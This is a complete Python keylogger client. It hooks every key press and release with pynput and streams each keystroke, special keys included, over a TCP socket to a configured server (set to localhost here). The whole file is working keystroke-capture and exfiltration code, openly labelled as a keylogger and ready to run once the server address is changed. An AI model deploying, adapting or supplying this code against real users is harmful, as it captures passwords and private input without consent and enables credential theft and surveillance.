import socket
from pynput.keyboard import Key, Listener

# Server Connection Configuration
SERVER_HOST = '127.0.0.1'  # Server IP address
SERVER_PORT = 65432

def start_client():
    """Starts the keylogger client and connects to the server."""
    try:
        # Establish connection to the server
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((SERVER_HOST, SERVER_PORT))
        print("Connected to the server. Keylogger active...\nPress 'Esc' to stop.")

        # Capture and send keystroke data
        def send_key_event(event_type, key):
            """Sends formatted keystroke events to the server."""
            if hasattr(key, 'char') and key.char:  # Printable keys
                message = f"{event_type}: '{key.char}'"
            else:  # Special keys
                special_keys = {
                    Key.space: "Space",
                    Key.enter: "Enter",
                    Key.backspace: "Backspace",
                    Key.tab: "Tab",
                    Key.shift: "Shift",
                    Key.ctrl_l: "Left Ctrl",
                    Key.ctrl_r: "Right Ctrl",
                    Key.alt_l: "Left Alt",
                    Key.alt_r: "Right Alt",
                    Key.caps_lock: "Caps Lock",
                    Key.esc: "Escape",
                    Key.up: "Up Arrow",
                    Key.down: "Down Arrow",
                    Key.left: "Left Arrow",
                    Key.right: "Right Arrow"
                }
                message = f"{event_type}: [{special_keys.get(key, str(key))}]"
            
            # Send message to the server
            client_socket.sendall(message.encode('utf-8'))

        # Define keyboard event listeners
        def on_press(key):
            send_key_event("Pressed", key)

        def on_release(key):
            send_key_event("Released", key)
            if key == Key.esc:  # Press 'Esc' to stop the keylogger
                client_socket.close()
                print("Keylogger stopped.")
                return False

        # Start listening to keyboard events
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
        # with Listener(on_release=on_release) as listener:
        #     listener.join()

    except Exception as e:
        print(f"Connection error: {e}")

# Run the client
if __name__ == "__main__":
    start_client()
